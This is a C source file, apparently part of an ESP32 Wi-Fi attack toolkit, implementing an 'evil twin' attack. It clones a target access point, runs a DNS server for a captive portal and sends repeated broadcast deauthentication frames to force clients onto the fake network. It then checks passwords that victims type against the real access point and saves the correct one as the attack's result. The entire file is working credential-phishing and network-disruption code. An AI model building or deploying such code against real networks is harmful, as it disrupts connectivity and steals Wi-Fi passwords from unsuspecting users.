/**
 * @file attack_evil_twin.c
 * @author ravijol1 (liamstaric@gmail.com)
 * @date 2026-06-18
 * @copyright Copyright (c) 2026
 *
 * @brief Implements evil twin attack.
 */

#include "attack_evil_twin.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_wifi_types.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"
#include "webserver.h"

#include "esp_timer.h"

static esp_timer_handle_t s_deauth_resume_timer = NULL;

static const char *TAG = "main:attack_evil_twin";
static attack_evil_twin_methods_t method = -1;
static const wifi_ap_record_t *ap_record = NULL;
static int s_connected_clients = 0;
static bool s_had_client = false;

static void deauth_resume_timer_cb(void *arg) {
    if (s_connected_clients == 0) {
        ESP_LOGI(TAG, "Grace period elapsed, resuming deauth");
        attack_method_broadcast(ap_record, 100);
    }
}

static void on_client_connected(void) {
    s_connected_clients++;
    s_had_client = true;
    ESP_LOGI(TAG, "Client on evil twin (clients: %d)", s_connected_clients);
}

static void on_client_disconnected(void) {
    s_connected_clients--;
    if (s_connected_clients < 0) s_connected_clients = 0;
    ESP_LOGI(TAG, "Client left evil twin (clients: %d)", s_connected_clients);
}

void attack_evil_twin_start(attack_config_t *attack_config){
    s_deauth_resume_timer = NULL;
    s_had_client = false;
    ESP_LOGI(TAG, "Starting evil twin attack...");
    ap_record = attack_config->ap_record;
    method = attack_config->method;
    s_connected_clients = 0;

    switch(attack_config->method){
        case ATTACK_EVIL_TWIN_DEFAULT:
            ESP_LOGD(TAG, "ATTACK_EVIL_TWIN_DEFAULT");
            attack_method_evil_twin(ap_record);
            dns_server_start();
            wifictl_set_ap_sta_connected_cb(on_client_connected);
            wifictl_set_ap_sta_disconnected_cb(on_client_disconnected);
            attack_method_broadcast(ap_record, 100);
            break;
        default:
            ESP_LOGD(TAG, "Method unknown!");
    }
}

void attack_evil_twin_stop(){
    wifictl_set_ap_sta_connected_cb(NULL);
    wifictl_set_ap_sta_disconnected_cb(NULL);
    if (s_deauth_resume_timer) {
        esp_timer_stop(s_deauth_resume_timer);
        esp_timer_delete(s_deauth_resume_timer);
        s_deauth_resume_timer = NULL;
    }
    if (attack_method_broadcast_is_running()) {
        attack_method_broadcast_stop();
    }
    s_connected_clients = 0;
    dns_server_stop();
    switch(method){
        case ATTACK_EVIL_TWIN_DEFAULT:
            wifictl_mgmt_ap_start();
            break;
        default:
            ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
    }
    ap_record = NULL;
    method = -1;
    ESP_LOGD(TAG, "Evil twin attack stopped");
}

bool attack_evil_twin_check_password(const char *password) {
    ESP_LOGD(TAG, "Checking password: %s", password);
    if (ap_record == NULL) {
        ESP_LOGE(TAG, "No target AP record!");
        return false;
    }

    if (wifictl_sta_check_password(ap_record, password)) {
        ESP_LOGI(TAG, "Password correct! Stopping attack...");
        if (!attack_alloc_result_content(strlen(password) + 1)) {
            ESP_LOGE(TAG, "Failed to allocate result content! Password was: %s", password);
            attack_update_status(FINISHED);
            attack_evil_twin_stop();
            return false;
        }
        strcpy(attack_get_status()->content, password);
        attack_update_status(FINISHED);
        attack_evil_twin_stop();
        return true;
    }

    ESP_LOGW(TAG, "Password wrong!");
    return false;
}

